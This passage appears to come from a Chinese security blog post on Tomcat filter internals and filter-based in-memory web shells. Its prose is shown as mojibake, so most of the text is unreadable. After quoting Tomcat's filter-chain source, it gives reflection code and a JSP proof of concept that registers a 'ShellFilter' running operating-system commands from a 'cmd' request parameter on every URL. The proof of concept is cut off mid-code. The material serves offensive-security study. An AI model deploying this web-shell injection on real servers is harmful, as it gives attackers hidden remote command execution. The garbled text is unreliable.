æ–¹æ³•ã€‚</p><p>åªè¦ Filter é“¾ä¸­ä»»æ„ä¸€ä¸ª Filter æ²¡æœ‰è°ƒç”¨ <code>FilterChain.doFilter()</code> æ–¹æ³•ï¼Œåˆ™ç›®æ ‡ <code>Servlet.service()</code> æ–¹æ³•éƒ½ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><h4 id="åœ¨è®¿é—®-filter-ä¹‹å‰çš„æµç¨‹åˆ†æ"><a href="#åœ¨è®¿é—®-filter-ä¹‹å‰çš„æµç¨‹åˆ†æ" class="headerlink" title="åœ¨è®¿é—® &#x2F;filter ä¹‹å‰çš„æµç¨‹åˆ†æ"></a>åœ¨è®¿é—® &#x2F;filter ä¹‹å‰çš„æµç¨‹åˆ†æ</h4><p>filteræ˜¯å¦‚ä½•è¢«åˆ›å»ºå¹¶æ³¨å†Œçš„</p><p>ä¹‹å‰çš„æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081514435.png" alt="img"></p><p>è¿›å…¥ StandardWrapperValve.invoke</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513163.png" alt="img"></p><p>è¿™ä¸ªå‡½æ•°ä¸­æœ‰ creatFilterChain</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513308.png" alt="img"></p><p>ä¸€ä¸ªfilterConfigå¯¹åº”ä¸€ä¸ªFilterï¼Œç”¨äºå­˜å‚¨Filterçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚è¿™é‡Œçš„<code>filters</code>å±æ€§æ˜¯ä¸€ä¸ªApplicationFilterConfigæ•°ç»„ã€‚æˆ‘ä»¬æ¥å¯»æ‰¾ä¸€ä¸‹<code>ApplicationFilterChain.filters</code>å±æ€§åœ¨å“ªé‡Œè¢«èµ‹å€¼ã€‚</p><p>åœ¨<code>StandardWrapperValve#invoke()</code>æ–¹æ³•ä¸­ï¼Œé€šè¿‡<code>ApplicationFilterFactory.createFilterChain()</code>æ–¹æ³•åˆå§‹åŒ–äº†ä¸€ä¸ª<code>ApplicationFilterChain</code>ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513147.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationFilterFactory</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ApplicationFilterChain <span class="hljs-title function_">createFilterChain</span><span class="hljs-params">(ServletRequest request, Wrapper wrapper, Servlet servlet)</span> &#123;<br><br>        <span class="hljs-comment">// If there is no servlet to execute, return null</span><br>        <span class="hljs-keyword">if</span> (servlet == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// Create and initialize a filter chain object</span><br>        ApplicationFilterChain filterChain;<br>        <span class="hljs-keyword">if</span> (request <span class="hljs-keyword">instanceof</span> Request) &#123;<br>            <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) request;<br>            <span class="hljs-keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;<br>                <span class="hljs-comment">// Security: Do not recycle</span><br>                filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                filterChain = (ApplicationFilterChain) req.getFilterChain();<br>                <span class="hljs-keyword">if</span> (filterChain == <span class="hljs-literal">null</span>) &#123;<br>                    filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>                    req.setFilterChain(filterChain);<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Request dispatcher in use</span><br>            filterChain = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApplicationFilterChain</span>();<br>        &#125;<br><br>        <span class="hljs-comment">// åˆ›å»º filterChain </span><br>        filterChain.setServlet(servlet);<br>        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());<br><br>        <span class="hljs-comment">// Acquire the filter mappings for this Context</span><br>        <span class="hljs-comment">//wrapper.getParent() è·å– StandardContext å¯¹è±¡</span><br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) wrapper.getParent();<br>        <span class="hljs-comment">//è·å–StandardContextä¸­çš„FilterMapså¯¹è±¡ï¼ŒFilterMapså¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯</span><br>        FilterMap filterMaps[] = context.findFilterMaps();<br><br>        <span class="hljs-comment">// If there are no filter mappings, we are done</span><br>        <span class="hljs-keyword">if</span> (filterMaps == <span class="hljs-literal">null</span> || filterMaps.length == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> filterChain;<br>        &#125;<br><br>        <span class="hljs-comment">// Acquire the information we will need to match filter mappings</span><br>        <span class="hljs-type">DispatcherType</span> <span class="hljs-variable">dispatcher</span> <span class="hljs-operator">=</span> (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestPath</span> <span class="hljs-operator">=</span> FilterUtil.getRequestPath(request);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">servletName</span> <span class="hljs-operator">=</span> wrapper.getName();<br><br>        <span class="hljs-comment">// Add the relevant path-mapped filters to this filter chain</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!FilterUtil.matchFiltersURL(filterMap, requestPath)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">//åœ¨StandardContextä¸­è·å–FilterConfig</span><br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>                log.warn(sm.getString(<span class="hljs-string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, filterMap.getFilterName()));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-comment">//å°†ä¸€ä¸ªfilterConfigæ·»åŠ åˆ°filterChainä¸­</span><br>            filterChain.addFilter(filterConfig);<br>        &#125;<br><br>        <span class="hljs-comment">// Add filters that match on servlet name second</span><br>        <span class="hljs-keyword">for</span> (FilterMap filterMap : filterMaps) &#123;<br>            <span class="hljs-keyword">if</span> (!matchDispatcher(filterMap, dispatcher)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (!matchFiltersServlet(filterMap, servletName)) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span><br>            (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());<br>            <span class="hljs-keyword">if</span> (filterConfig == <span class="hljs-literal">null</span>) &#123;<br>                log.warn(sm.getString(<span class="hljs-string">&quot;applicationFilterFactory.noFilterConfig&quot;</span>, filterMap.getFilterName()));<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            filterChain.addFilter(filterConfig);<br>        &#125;<br><br>        <span class="hljs-comment">// Return the completed filter chain</span><br>        <span class="hljs-keyword">return</span> filterChain;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å°ç»“ï¼šfilterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹"><a href="#å°ç»“ï¼šfilterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹" class="headerlink" title="å°ç»“ï¼šfilterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹"></a>å°ç»“ï¼šfilterChainå¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹</h4><ol><li>é¦–å…ˆé€šè¿‡<code>filterChain = new ApplicationFilterChain()</code>åˆ›å»ºä¸€ä¸ªç©ºçš„ filterChain å¯¹è±¡</li><li>ç„¶åé€šè¿‡<code>wrapper.getParent()</code>å‡½æ•°æ¥è·å–<code>StandardContext</code>å¯¹è±¡</li><li>æ¥ç€è·å–<code>StandardContext</code>ä¸­çš„<code>FilterMaps</code>å¯¹è±¡ï¼Œ<code>FilterMaps</code>å¯¹è±¡ä¸­å­˜å‚¨çš„æ˜¯å„Filterçš„åç§°è·¯å¾„ç­‰ä¿¡æ¯</li><li>æœ€åæ ¹æ®Filterçš„åç§°ï¼Œåœ¨<code>StandardContext</code>ä¸­è·å–<code>FilterConfig</code></li><li>é€šè¿‡<code>filterChain.addFilter(filterConfig)</code>å°†ä¸€ä¸ª<code>filterConfig</code>æ·»åŠ åˆ°<code>filterChain</code>ä¸­</li></ol><p>è·Ÿè¿›åˆ° createFilterChain å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ­¤æ—¶çš„ä¸Šä¸‹æ–‡å¯¹è±¡<code>StandardContext</code>å®é™…ä¸Šæ˜¯åŒ…å«äº†<strong>filterConfigsã€filterDefsã€filterMaps</strong></p><p><strong>filterConfigs:åŒ…å«æ‰€æœ‰ä¸è¿‡æ»¤å™¨å¯¹åº”çš„filterDefä¿¡æ¯åŠè¿‡æ»¤å™¨å®ä¾‹ï¼Œè¿›è¡Œè¿‡æ»¤å™¨è¿›è¡Œç®¡ç†</strong></p><p>å…¶ä¸­filterConfigsåŒ…å«äº†å½“å‰çš„ä¸Šä¸‹æ–‡ä¿¡æ¯<code>StandardContext</code>ã€ä»¥åŠ<code>filterDef</code>ç­‰ä¿¡æ¯</p><p><strong>filterDef</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">filterDef`å¿…è¦çš„å±æ€§ä¸º`filter`ã€`filterClass`ä»¥åŠ`filterName<br></code></pre></td></tr></table></figure><p>filterDef å°±æ˜¯å¯¹åº” web.xml ä¸­çš„ filter æ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>filter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>filterDefs:åŒ…å«æ‰€æœ‰è¿‡æ»¤å™¨åŒ…æ‹¬å®ä¾‹å†…éƒ¨ç­‰å˜é‡</strong> </p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">filterDefs`æ˜¯ä¸€ä¸ªHashMapï¼Œä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨`filterDef<br></code></pre></td></tr></table></figure><p><strong>filterMaps:åŒ…å«æ‰€æœ‰è¿‡æ»¤å™¨çš„URLæ˜ å°„å…³ç³»</strong> </p><p><code>filterMaps</code>ä¸­ä»¥arrayçš„å½¢å¼å­˜æ”¾å„filterçš„è·¯å¾„æ˜ å°„ä¿¡æ¯ï¼Œå…¶å¯¹åº”çš„æ˜¯web.xmlä¸­çš„<code>&lt;filter-mapping&gt;</code>æ ‡ç­¾</p><p>filterMapså¿…è¦çš„å±æ€§ä¸º<code>dispatcherMapping</code>ã€<code>filterName</code>ã€<code>urlPatterns</code></p><h3 id="1-3-æ”»å‡»æ€è·¯ï¼š"><a href="#1-3-æ”»å‡»æ€è·¯ï¼š" class="headerlink" title="1.3 æ”»å‡»æ€è·¯ï¼š"></a>1.3 æ”»å‡»æ€è·¯ï¼š</h3><p>åªéœ€è¦æ„é€ å«æœ‰æ¶æ„çš„ filter çš„ <strong>filterConfig</strong> å’Œæ‹¦æˆªå™¨ <strong>filterMaps</strong>ï¼Œå°±å¯ä»¥è§¦å‘ï¼Œè€Œè¿™ä¸ª filterMaps ä¸­çš„æ•°æ®å¯¹åº” web.xml ä¸­çš„ filter-mapping æ ‡ç­¾</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.src.tomcatdemo.FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>FilterTest<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/filter<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆåªè¦å¯ä»¥æ›´æ”¹web.xml çš„filter-mapping æ ‡ç­¾ï¼Œå°±å¯ä»¥æ”»å‡»æˆåŠŸäº†</p><p>æ‰¾åˆ° FilterMaps é€šè¿‡ä¸‹é¢çš„ä¿©ä¸ªæ–¹æ³•è¿›è¡Œæ·»åŠ æ•°æ®</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513037.png" alt="img"></p><p>å…¶ä¸­çš„ <strong>filterConfig</strong> å¯ä»¥é€šè¿‡ filterConfigs.put(name, filterConfig); æ·»åŠ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081513116.png" alt="img"></p><p><strong>åŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯</strong></p><ol><li>è·å–StandardContextå¯¹è±¡</li></ol><p>è¿™ä¸€æ­¥å’Œ servlet çš„è·å– StandardContext å¯¹è±¡ä¸€è‡´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextFiled</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextFiled.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);<br><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><ol><li>åˆ›å»ºæ¶æ„Filter</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.tomcatdemo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>            n.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;CommonFilter&quot;</span>;<br>   <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>   filterDef.setFilter(filter);<br>   filterDef.setFilterName(name);<br>   filterDef.setFilterClass(filter.getClass().getName());<br>   context.addFilterDef(filterDef);<br></code></pre></td></tr></table></figure><ol><li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setFilterName(name);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    context.addFilterMapBefore(filterMap);<br></code></pre></td></tr></table></figure><ol><li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContextField.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(context);<br><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context, filterDef);<br>    filterConfigs.put(name, filterConfig);<br></code></pre></td></tr></table></figure><h4 id="å®Œæ•´-POCï¼šaddFilter-jsp"><a href="#å®Œæ•´-POCï¼šaddFilter-jsp" class="headerlink" title="å®Œæ•´ POCï¼šaddFilter.jsp"></a>å®Œæ•´ POCï¼šaddFilter.jsp</h4><p><strong>ï¼ˆä¸€å®šè¦æ³¨æ„åŒ…ä¸èƒ½å¯¼é”™ï¼ï¼‰</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2</span><br>  Time: <span class="hljs-number">13</span>:<span class="hljs-number">42</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-comment">//æœ‰å›æ˜¾çš„ JSP</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>            <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> 